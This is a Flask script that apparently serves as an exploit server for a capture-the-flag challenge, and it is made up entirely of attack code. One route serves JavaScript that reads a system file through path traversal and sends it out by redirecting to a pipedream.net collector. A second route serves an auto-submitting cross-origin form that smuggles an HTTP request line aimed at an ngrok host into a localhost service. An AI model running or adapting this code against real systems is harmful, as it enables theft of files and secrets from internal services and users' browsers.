from flask import Flask, Response

app = Flask(__name__)

@app.route("/")
def index():
    resp = Response("""
    var request = new XMLHttpRequest();
    request.open('GET', '/api/ipc_download?file=../../../../../../sys/class/net/eth0/address ', false);
    request.send();

var flag = request.responseText;
window.location.href = "https://end3yx9kqyxwf.x.pipedream.net/?flag=" + flag;




                      """)

    resp.headers["Content-Type"] = "text/plain"
    return resp

@app.route("/exploit")
def exploit():
    return """
     <form id="x" action="http://localhost:1337/" method="POST" enctype="text/plain">
      <textarea name="GET http://5.tcp.eu.ngrok.io:12147 HTTP/1.1
    Foo: x">
        Mizu</textarea>
      <button type="submit">CLICK ME</button>
    </form>
    <script>
      x.submit();
    </script>   
    """

if __name__ == "__main__":
    app.run("0.0.0.0", 3000)
